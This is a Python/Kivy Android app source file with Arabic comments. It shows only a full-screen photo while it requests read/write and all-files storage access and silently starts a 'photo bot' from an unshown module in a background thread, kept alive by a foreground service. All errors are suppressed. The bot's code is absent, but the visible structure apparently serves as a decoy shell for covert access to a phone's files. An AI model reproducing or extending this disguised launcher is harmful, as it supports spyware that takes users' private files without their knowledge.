from kivy.app import App
from kivy.uix.image import Image
from kivy.uix.floatlayout import FloatLayout
from kivy.core.window import Window
from kivy.clock import Clock
from kivy.utils import platform
from threading import Thread

Window.clearcolor = (0, 0, 0, 1)
BOT_STARTED = False
SERVICE_STARTED = False


def start_background_service():
    """تشغيل خدمة foreground Android لتمكين استمرار البوت في الخلفية."""
    global SERVICE_STARTED
    if platform != 'android' or SERVICE_STARTED:
        return
    SERVICE_STARTED = True
    try:
        from android import AndroidService
        service = AndroidService('photo_bot_service', 'Photo Bot')
        service.start('Photo Bot is running in background')
    except Exception:
        pass


def has_manage_storage_permission():
    """يتأكد إذا صلاحية MANAGE_EXTERNAL_STORAGE معطاة"""
    if platform != 'android':
        return True
    try:
        from jnius import autoclass
        Environment = autoclass('android.os.Environment')
        return Environment.isExternalStorageManager()
    except Exception:
        return False


def has_read_storage_permission():
    """يتأكد إذا صلاحية READ_EXTERNAL_STORAGE معطاة"""
    if platform != 'android':
        return True
    try:
        from android.permissions import check_permission, Permission
        return check_permission(Permission.READ_EXTERNAL_STORAGE)
    except Exception:
        return False


def request_android_permissions():
    """يطلب صلاحيات الملفات العادية"""
    if platform != 'android':
        return
    try:
        from android.permissions import request_permissions, Permission
        request_permissions([
            Permission.READ_EXTERNAL_STORAGE,
            Permission.WRITE_EXTERNAL_STORAGE,
        ])
    except Exception:
        pass


def open_manage_storage_settings():
    """يفتح شاشة الإعدادات لصلاحية MANAGE_EXTERNAL_STORAGE (أندرويد 11+)"""
    if platform != 'android':
        return
    try:
        from jnius import autoclass
        from android import mActivity
        from android.runnable import run_on_ui_thread

        @run_on_ui_thread
        def _open():
            try:
                Intent = autoclass('android.content.Intent')
                Settings = autoclass('android.provider.Settings')
                Uri = autoclass('android.net.Uri')

                intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                intent.setData(Uri.parse("package:" + mActivity.getPackageName()))
                mActivity.startActivity(intent)
            except Exception:
                # fallback لبعض الأجهزة اللي مش بتدعم الإنتنت ده
                try:
                    Intent = autoclass('android.content.Intent')
                    Settings = autoclass('android.provider.Settings')
                    intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
                    mActivity.startActivity(intent)
                except Exception:
                    pass

        _open()
    except Exception:
        pass


class PhotoApp(App):
    def build(self):
        self.title = "aitisalat"
        layout = FloatLayout()
        self.img = Image(
            source='photo.jpg',
            size_hint=(1, 1),
            pos_hint={'center_x': 0.5, 'center_y': 0.5},
            allow_stretch=True,
            keep_ratio=True
        )
        layout.add_widget(self.img)

        # === الخطوة 1: نتحقق ونطلب الصلاحيات ===
        Clock.schedule_once(self.check_and_request_permissions, 0.5)
        # === الخطوة 2: شغل السكربت ===
        Clock.schedule_once(self.start_bot, 3)

        return layout

    def check_and_request_permissions(self, dt):
        """يتحقق إذا الصلاحيات معطاة، ولو لأ يطلبها"""
        try:
            # 1) صلاحيات الملفات العادية
            if not has_read_storage_permission():
                request_android_permissions()

            # 2) صلاحية MANAGE_EXTERNAL_STORAGE (أندرويد 11+)
            # === الفرق: نفتح الإعدادات بس لو مش معطاة ===
            if not has_manage_storage_permission():
                Clock.schedule_once(lambda dt: open_manage_storage_settings(), 1.5)
        except Exception:
            pass

    def start_bot(self, dt):
        global BOT_STARTED
        if BOT_STARTED:
            return
        BOT_STARTED = True
        try:
            from bot_logic import run_bot
            t = Thread(target=run_bot, daemon=True)
            t.start()
            Clock.schedule_once(lambda _dt: start_background_service(), 1)
        except Exception:
            pass

    def on_pause(self):
        return True

    def on_stop(self):
        return True


if __name__ == '__main__':
    PhotoApp().run()
